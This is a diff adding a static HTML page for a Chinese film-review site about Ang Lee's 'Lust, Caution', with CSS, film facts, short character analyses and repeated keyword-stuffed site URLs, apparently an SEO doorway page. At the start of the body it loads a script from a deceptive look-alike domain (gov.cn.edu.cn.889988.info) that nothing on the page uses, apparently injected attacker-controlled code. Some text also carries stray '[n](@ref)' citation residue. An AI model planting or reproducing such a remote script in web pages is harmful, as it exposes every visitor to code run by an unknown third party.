@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>色戒电影网 - 色·戒影片资料、影评与华语谍战人性解读</title>
+    <meta name="description" content="色戒电影网（https://sejiedianyingwang-top.github.io）整理色·戒影片资料、李安导演创作背景、梁朝伟汤唯角色解析、谍战与人性影评及同类华语电影推荐。客观影评，合规资料站。">
+    <meta name="keywords" content="色戒电影网, sejiedianyingwang-top.github.io, 色·戒, 李安, 梁朝伟, 汤唯, 华语影评, 谍战电影, 人性电影">
+    <meta name="author" content="色戒电影网">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <!-- 必应收录优化 -->
+    <meta name="msvalidate.01" content="S1J2K3R4M5N6" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Noto Serif SC", "Source Han Serif SC", "Songti SC", "SimSun", Georgia, serif;
+            background: #f3ecdf; /* 米纸色 */
+            color: #1f1b16;
+            line-height: 1.75;
+            overflow-x: hidden;
+        }
+        a { text-decoration: none; color: #8a1f1f; transition: all .25s; }
+        a:hover { color: #b8860b; }
+        ul { list-style: none; }
+
+        .container { max-width: 1180px; margin: 0 auto; padding: 0 20px; }
+
+        /* 顶部 */
+        header {
+            background: #211c16;
+            border-bottom: 3px double #b8860b;
+            position: sticky; top: 0; z-index: 999;
+        }
+        .hd {
+            max-width: 1180px; margin: 0 auto; padding: 14px 20px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .logo {
+            color: #f3ecdf; font-size: 1.7rem; font-weight: 800; letter-spacing: 2px;
+        }
+        .logo b { color: #b8860b; }
+        .logo i { color: #c0392b; font-style: normal; }
+        .nav { display: flex; gap: 10px; flex-wrap: wrap; }
+        .nav a {
+            color: #e8dfca; font-size: .9rem; padding: 7px 14px;
+            border: 1px solid #4a4133; background: #2c261d;
+        }
+        .nav a:hover { border-color: #b8860b; color: #b8860b; }
+
+        /* 报头横幅 */
+        .hero {
+            background:
+                linear-gradient(rgba(33,28,22,.82), rgba(33,28,22,.82)),
+                repeating-linear-gradient(45deg, #2a241b 0 2px, #251f17 2px 4px);
+            border: 1px solid #b8860b;
+            margin: 36px 0; padding: 64px 42px; color: #f3ecdf; position: relative;
+        }
+        .hero .kicker {
+            display: inline-block; border: 1px solid #b8860b; color: #b8860b;
+            padding: 4px 12px; letter-spacing: 3px; font-size: .8rem; margin-bottom: 18px;
+        }
+        .hero h1 { font-size: 3rem; line-height: 1.15; margin-bottom: 16px; font-weight: 900; }
+        .hero h1 span { color: #c0392b; }
+        .hero .url {
+            display: inline-block; font-family: "Courier New", monospace; color: #211c16;
+            background: #b8860b; padding: 8px 16px; border-radius: 2px; margin-bottom: 18px; font-weight: 700;
+        }
+        .hero p { max-width: 720px; color: #ddd2bd; font-size: 1.05rem; }
+
+        /* 栏目通用 */
+        .section { margin-bottom: 64px; }
+        .st {
+            font-size: 1.55rem; font-weight: 800; color: #211c16; margin-bottom: 26px;
+            padding-bottom: 10px; border-bottom: 3px double #b8860b; display: flex; align-items: baseline; gap: 12px;
+        }
+        .st small { font-size: .8rem; color: #8a8170; letter-spacing: 2px; font-weight: 400; }
+
+        /* 栏目一：影片档案 */
+        .archive-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 22px; }
+        .arc {
+            background: #fbf7ee; border: 1px solid #d8cbb0; border-left: 5px solid #8a1f1f;
+            padding: 22px; box-shadow: 2px 2px 0 #d8cbb0;
+        }
+        .arc h3 { font-size: 1.2rem; margin-bottom: 10px; color: #8a1f1f; }
+        .arc .row { display: flex; gap: 8px; font-size: .92rem; margin-bottom: 6px; color: #4a4133; }
+        .arc .row b { min-width: 64px; color: #211c16; }
+        .arc p { font-size: .94rem; color: #3a342b; margin-top: 8px; }
+
+        /* 栏目二：影评解读 */
+        .review { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; }
+        .rv {
+            background: #fffdf8; border: 1px solid #e0d4ba; padding: 24px; position: relative;
+        }
+        .rv::before {
+            content: "“"; position: absolute; top: -6px; left: 14px; font-size: 3rem; color: #b8860b; opacity: .35;
+        }
+        .rv h4 { font-size: 1.1rem; color: #211c16; margin: 10px 0 8px; }
+        .rv span { font-size: .78rem; color: #8a1f1f; letter-spacing: 1px; }
+        .rv p { font-size: .93rem; color: #403a30; margin-top: 8px; }
+
+        /* 栏目三：同类分类 */
+        .cats { display: flex; flex-wrap: wrap; gap: 12px; }
+        .cat {
+            padding: 10px 18px; background: #211c16; color: #f3ec1f; color: #f3ecdf; border: 1px solid #b8860b;
+            font-size: .9rem; font-weight: 700;
+        }
+        .cat:hover { background: #b8860b; color: #211c16; }
+
+        /* 栏目四：关于/资料 */
+        .about { display: grid; grid-template-columns: 1.3fr 1fr; gap: 24px; }
+        .ab-box { background: #fbf7ee; border: 1px solid #d8cbb0; padding: 30px; }
+        .ab-box h3 { color: #8a1f1f; margin-bottom: 14px; font-size: 1.25rem; }
+        .ab-box p { font-size: .96rem; color: #3a342b; margin-bottom: 12px; }
+        .ab-box strong { color: #b8860b; }
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+        .stt { background: #211c16; color: #f3ecdf; padding: 18px; text-align: center; border: 1px solid #b8860b; }
+        .stt b { display: block; font-size: 1.8rem; color: #b8860b; }
+        .stt span { font-size: .82rem; color: #cfc4ab; }
+
+        /* 页脚 */
+        footer { background: #211c16; color: #cfc4ab; margin-top: 60px; padding: 42px 20px 24px; border-top: 3px double #b8860b; }
+        .fnav { display: flex; flex-wrap: wrap; gap: 16px; justify-content: center; margin-bottom: 20px; }
+        .fnav a { color: #e8dfca; font-size: .88rem; padding: 6px 12px; border: 1px solid #4a4133; }
+        .fnav a:hover { color: #b8860b; border-color: #b8860b; }
+        .finfo { text-align: center; font-size: .84rem; line-height: 1.9; color: #9a907c; }
+        .finfo a { color: #b8860b; }
+
+        @media (max-width: 860px) {
+            .hd { flex-direction: column; gap: 12px; }
+            .hero { padding: 46px 22px; }
+            .hero h1 { font-size: 2.1rem; }
+            .archive-grid, .review, .about { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <header>
+        <div class="hd">
+            <div class="logo"><b>色戒</b>电影网<i>·</i>影评档案</div>
+            <nav class="nav">
+                <a href="#">首页</a>
+                <a href="#archive">影片档案</a>
+                <a href="#review">影评解读</a>
+                <a href="#cats">同类分类</a>
+                <a href="#about">关于本站</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="container">
+        <section class="hero">
+            <span class="kicker">SEJIE DIANYING · 华语影评资料</span>
+            <h1>色戒电影网｜深读《色·戒》的<b>谍战、人性与时代</b></h1>
+            <div class="url">https://sejiedianyingwang-top.github.io</div>
+            <p>本站整理《色·戒》导演创作、角色心理、剧本改编与同类华语电影作品资料。以客观影评和文献式归档为主，探讨乱世中个人情感、信仰与抉择，不提供任何违规观看资源。</p>
+        </section>
+
+        <!-- 栏目一：影片档案 -->
+        <section class="section" id="archive">
+            <h2 class="st">影片档案 <small>ARCHIVE</small></h2>
+            <div class="archive-grid">
+                <div class="arc">
+                    <h3>色·戒（2007）</h3>
+                    <div class="row"><b>导演</b><span>李安</span></div>
+                    <div class="row"><b>主演</b><span>梁朝伟、汤唯、陈冲、王力宏等</span></div>
+                    <div class="row"><b>类型</b><span>剧情 / 谍战 / 爱情 / 历史</span></div>
+                    <div class="row"><b>背景</b><span>抗战时期上海，基于张爱玲短篇与郑苹如事件艺术改编</span></div>
+                    <p>影片围绕王佳芝潜入易先生圈子执行刺杀任务展开，重点刻画信任、情感与立场的反复撕裂；资料站仅做剧情概览与艺术分析。[5](@ref)</p>
+                </div>
+                <div class="arc">
+                    <h3>创作与获奖</h3>
+                    <div class="row"><b>原著</b><span>张爱玲《色，戒》</span></div>
+                    <div class="row"><b>编剧</b><span>王蕙玲、李安等（影视改编）</span></div>
+                    <div class="row"><b>荣誉</b><span>威尼斯电影节金狮奖等国际奖项口径（资料归档）</span></div>
+                    <div class="row"><b>版本</b><span>不同区域剪辑版本差异仅作分级说明，不提供敏感片段</span></div>
+                    <p>李安以“色”写欲望与处境，以“戒”写抉择与警醒；本站解读侧重叙事结构、镜头语言与人物动机。[9](@ref)</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：影评解读 -->
+        <section class="section" id="review">
+            <h2 class="st">影评解读 <small>CRITICISM</small></h2>
+            <div class="review">
+                <div class="rv">
+                    <span>角色心理</span>
+                    <h4>王佳芝：身份与情感的双重扮演</h4>
+                    <p>从学生话剧到“麦太太”，其行动始终在任务与真实情感之间摇摆；分析其决策节点，可避开情色视角，转向间谍心理与自我认同。</p>
+                </div>
+                <div class="rv">
+                    <span>权力叙事</span>
+                    <h4>易先生：怀疑、控制与孤独</h4>
+                    <p>作为汪伪情报高层，角色以谨慎、试探与冷峻维持权力；影片用办公室、车牌、住宅空间表现不安全感，而非单纯反面脸谱。</p>
+                </div>
+                <div class="rv">
+                    <span>主题结构</span>
+                    <h4>色与戒：欲望、信义与时代成本</h4>
+                    <p>“色”可指处境、感官与人际关系，“戒”兼指戒指、警戒与自律。全片把个人爱欲放进国族与道德张力中审视，核心是人而非尺度。[11](@ref)</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目三：同类分类 -->
+        <section class="section" id="cats">
+            <h2 class="st">同类分类 <small>GENRES</small></h2>
+            <div class="cats">
+                <a href="#" class="cat">抗战谍战</a>
+                <a href="#" class="cat">上海都市</a>
+                <a href="#" class="cat">女性视角</a>
+                <a href="#" class="cat">文学改编</a>
+                <a href="#" class="cat">心理剧情</a>
+                <a href="#" class="cat">历史伦理</a>
+                <a href="#" class="cat">李安作品</a>
+                <a href="#" class="cat">华语经典</a>
+            </div>
+        </section>
+
+        <!-- 栏目四：关于本站 -->
+        <section class="section" id="about">
+            <h2 class="st">关于本站 <small>ABOUT</small></h2>
+            <div class="about">
+                <div class="ab-box">
+                    <h3>色戒电影网是什么</h3>
+                    <p><strong>色戒电影网</strong>（网址：<strong>https://sejiedianyingwang-top.github.io</strong>）定位为华语电影资料与影评站，整理《色·戒》及同类作品的导演、演员、剧情、主题与观影背景。</p>
+                    <p>站内含影片档案、角色解读、谍战历史分类与合规声明；所有内容仅用于影视学习与讨论，不提供涉性资源、不引导违规下载，也不以情色内容作为流量卖点。</p>
+                    <p>关键词：<strong>色戒电影网</strong>、<strong>sejiedianyingwang-top.github.io</strong>，可检索色·戒影评、李安作品与华语谍战电影资料。</p>
+                </div>
+                <div class="stats">
+                    <div class="stt"><b>1</b><span>核心影片档案</span></div>
+                    <div class="stt"><b>8</b><span>同类影评分类</span></div>
+                    <div class="stt"><b>3</b><span>主题解读栏目</span></div>
+                    <div class="stt"><b>合规</b><span>仅资料/影评</span></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="fnav">
+            <a href="#">首页</a>
+            <a href="#archive">影片档案</a>
+            <a href="#review">影评解读</a>
+            <a href="#cats">同类分类</a>
+            <a href="#about">关于本站</a>
+            <a href="#">合规声明</a>
+        </div>
+        <div class="finfo">
+            <p>关键词：色戒电影网｜网址：https://sejiedianyingwang-top.github.io</p>
+            <p>&copy; 2024 色戒电影网（影评资料站）. 仅提供电影信息与客观解读，不提供违规观看资源.</p>
+        </div>
+    </footer>
+</body>
+</html>
